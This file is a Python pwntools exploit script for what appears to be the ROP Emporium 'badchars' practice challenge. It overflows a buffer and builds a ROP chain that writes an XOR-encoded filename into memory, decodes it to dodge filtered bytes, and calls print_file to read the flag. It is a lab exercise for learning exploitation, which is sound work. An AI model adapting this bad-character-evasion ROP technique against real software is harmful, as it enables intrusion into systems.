#!/usr/bin/python3
from pwn import *

def add_to_payload(payload, data):
    for bad_char in BAD_CHARS:
        if bad_char in data:
            print(f'{bad_char} is in {data}. NOT ALLOWED')
            exit()
    payload += data
    return payload

# badchars are: 'x', 'g', 'a', '.'
#               0x78 0x67 0x61 0x2E
BAD_CHARS = [0x78, 0x67, 0x61, 0x2E]
WRITE_ADDR_HEX = 0x0060102f
WRITE_ADDR = p64(WRITE_ADDR_HEX)
FILENAME = b'flag.txt'
FILENAME_XORED = b'eobd-w{w'
XOR_KEY = p64(0x03)
XOR_ADDR = p64(0x00400628)
ADD_ADDR = p64(0x0040062c)
SUB_ADDR = p64(0x00400630)
MOV_ADDR = p64(0x00400634)
GARBAGE_64 = p64(0x00)

elf = context.binary = ELF('./badchars', checksec=False)
rop = ROP('./badchars')

buffer = 40 * b'c'
pop_r14_pop_r15 = p64(rop.r14_r15.address)
pop_r12_pop_r13_pop_r14_pop_r15 = p64(rop.r12_r13_r14_r15.address)
pop_rdi = p64(rop.rdi.address)
print_file_addr = p64(elf.plt.print_file)

payload = b''
payload = add_to_payload(payload, buffer)
# I must write a certain string in memory that doesn't contain the bad chars
# and then adjust it using xor, add and/or sub to retrieve the intended 
# 'flag.txt'. Then I could call print_file with the right parameter
# 1. Write FILENAME_XORED to memory (mov)
payload = add_to_payload(payload, pop_r12_pop_r13_pop_r14_pop_r15)  # ROP Gadget
payload = add_to_payload(payload, FILENAME_XORED) # r12
payload = add_to_payload(payload, WRITE_ADDR) # r13
payload = add_to_payload(payload, GARBAGE_64) # r14
payload = add_to_payload(payload, GARBAGE_64) # r15
payload = add_to_payload(payload, MOV_ADDR) # Write to memory
# 2. XOR the string (in memory) with the XOR_KEY to retrieve 'flag.txt'
for addr in range(WRITE_ADDR_HEX, WRITE_ADDR_HEX + len(FILENAME)):
    # For every letter in FLAG_XORED, xor with key
    payload = add_to_payload(payload, pop_r14_pop_r15)
    payload = add_to_payload(payload, XOR_KEY)
    payload = add_to_payload(payload, p64(addr))
    payload = add_to_payload(payload, XOR_ADDR)
# 3. Call print_file with 'flag.txt' as param
payload = add_to_payload(payload, pop_rdi)
payload = add_to_payload(payload, WRITE_ADDR)
payload = add_to_payload(payload, print_file_addr)

print(payload)
# Places a breakpoint at pwnme + 0x10c (ou + 268)
# p = gdb.debug('./badchars', 'b *(pwnme+268)')
p = process('./badchars')
p.recvuntil(b'>')
p.sendline(payload)
print(p.recvall().decode())
